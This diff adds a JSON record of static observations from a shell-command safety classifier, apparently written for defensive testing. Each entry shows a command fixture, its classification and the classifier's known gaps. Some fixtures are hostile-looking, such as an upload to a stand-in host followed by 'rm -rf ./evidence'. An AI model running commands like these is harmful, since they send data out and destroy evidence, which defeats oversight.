@@ -1,0 +1,194 @@
+{
+  "schema_version": 1,
+  "recorded_at": "2026-10-06T14:28:01.266355+00:00",
+  "milestone": "M2-preparatory-analysis-only",
+  "scope": "static parser observations; no command execution, Docker, model or attack sample",
+  "observations": [
+    {
+      "mechanism": "readonly_pipeline",
+      "command_fixture": "cat summary.txt | head -n 5",
+      "analysis": {
+        "classification": "read_only",
+        "safe_read_only": true,
+        "commands": [
+          "cat",
+          "head"
+        ],
+        "path_hints": [],
+        "reason_codes": [
+          "known_read_only_commands"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "redirection",
+      "command_fixture": "cat summary.txt > export.txt",
+      "analysis": {
+        "classification": "mutating",
+        "safe_read_only": false,
+        "commands": [],
+        "path_hints": [],
+        "reason_codes": [
+          "redirection"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "copy_then_egress",
+      "command_fixture": "cp summary.txt packed.txt && curl https://example.test/upload",
+      "analysis": {
+        "classification": "mutating",
+        "safe_read_only": false,
+        "commands": [
+          "cp"
+        ],
+        "path_hints": [
+          "https://example.test/upload"
+        ],
+        "reason_codes": [
+          "mutating_command"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "egress_then_delete",
+      "command_fixture": "curl https://example.test/upload && rm -rf ./evidence",
+      "analysis": {
+        "classification": "network",
+        "safe_read_only": false,
+        "commands": [
+          "curl"
+        ],
+        "path_hints": [
+          "https://example.test/upload",
+          "./evidence"
+        ],
+        "reason_codes": [
+          "network_command"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "interpreter",
+      "command_fixture": "python3 generated.py",
+      "analysis": {
+        "classification": "mutating",
+        "safe_read_only": false,
+        "commands": [
+          "python3"
+        ],
+        "path_hints": [],
+        "reason_codes": [
+          "mutating_command"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "shell_subexecution",
+      "command_fixture": "sh generated.sh",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [
+          "sh"
+        ],
+        "path_hints": [],
+        "reason_codes": [
+          "unknown_command"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "packaging",
+      "command_fixture": "tar -czf bundle.tar.gz ./notes",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [
+          "tar"
+        ],
+        "path_hints": [
+          "./notes"
+        ],
+        "reason_codes": [
+          "unknown_command"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "command_substitution",
+      "command_fixture": "cat $(printf summary.txt)",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [],
+        "path_hints": [],
+        "reason_codes": [
+          "command_substitution"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "search_exec",
+      "command_fixture": "rg --pre helper.py needle ./notes",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [
+          "rg"
+        ],
+        "path_hints": [
+          "./notes"
+        ],
+        "reason_codes": [
+          "search_external_program"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "find_exec",
+      "command_fixture": "find ./notes -exec sh helper.sh {} \\;",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [],
+        "path_hints": [
+          "./notes"
+        ],
+        "reason_codes": [
+          "empty_segment"
+        ]
+      },
+      "is_effect_receipt": false
+    },
+    {
+      "mechanism": "heredoc",
+      "command_fixture": "python3 <<EOF\nprint(1)\nEOF",
+      "analysis": {
+        "classification": "unknown",
+        "safe_read_only": false,
+        "commands": [],
+        "path_hints": [],
+        "reason_codes": [
+          "multiline_shell"
+        ]
+      },
+      "is_effect_receipt": false
+    }
+  ],
+  "findings": [
+    "Classifier returns at first non-read-only segment, so commands list may omit later commands",
+    "Copy/packaging and interpreter subexecution are not fully modeled effects; unknown remains non-automatable",
+    "Path hints are parameter references, not actual consumption or lineage"
+  ],
+  "next_action": "After M1 acceptance, define supported syntax and preserve unknown effects; pair actual consequences with native receipts before claiming gap closure"
+}
